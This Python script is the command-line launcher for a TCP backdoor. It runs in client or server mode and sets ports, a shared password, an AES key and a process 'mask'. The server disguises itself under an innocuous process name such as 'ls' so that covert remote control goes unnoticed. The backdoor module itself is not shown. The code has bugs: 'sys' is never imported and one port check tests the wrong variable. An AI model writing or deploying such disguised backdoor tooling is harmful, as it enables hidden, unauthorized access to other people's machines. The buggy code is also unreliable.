import argparse
import backdoor

DEFAULT_PW="characters"
DEFAULT_KEY="slightly better than the password ;)"
DEFAULT_MASK="ls"

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", help="the mode in which the application will run", choices=["client","server"])
    parser.add_argument("lport", help="the listening port (1-65535 inclusive) for receiving requests or responses", type=int)
    parser.add_argument("dport", help="the destination port (1-65535 inclusive) on the remote host", type=int)
    parser.add_argument("-p", "--password", help="the password to use for authentication (must be exactly 10 characters and be the same on client and server); if unspecified, a default is used")
    parser.add_argument("-k", "--key", help="the AES key to use for encryption (must be the same on client and server); if unspecified, a default is used")
    parser.add_argument("-s", "--server", help="the server host name or IP address; required and only valid if mode = client")
    parser.add_argument("-m", "--mask", help="the name to assign to this process (a default will be used if unspecified); only valid if mode = server")
    args = parser.parse_args()

    # Check for invalid arguments
    if args.lport < 1 or args.dport > 65535:
        print("lport must be >=1 and <= 65535, was {}".format(args.lport))
        sys.exit(1)
    elif args.dport < 1 or args.dport > 65535:
        print("dport must be >=1 and <= 65535, was {}".format(args.dport))
        sys.exit(1)

    if args.mode == "client":
        if args.mask:
            print("-m/--mask is only valid in server mode.")
            sys.exit(1)
        elif not args.server:
            print("-s/--server is required in client mode.")
            sys.exit(1)
    elif args.mode == "server" and args.server:
        print("-s/--server is only valid in client mode.")
        sys.exit(1)

    key = args.key if args.key else DEFAULT_KEY
    pw = args.password if args.password else DEFAULT_PW
  
    if args.mode == "server":
        mask = args.mask if args.mask else DEFAULT_MASK
        server = backdoor.TcpBackdoorServer(mask, key, pw, args.lport, args.dport)
        server.run()
    else:
        client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport)
        client.connect()
        # TODO: prompt user for commands until they press Ctrl + D

if __name__ == "__main__":
    main()
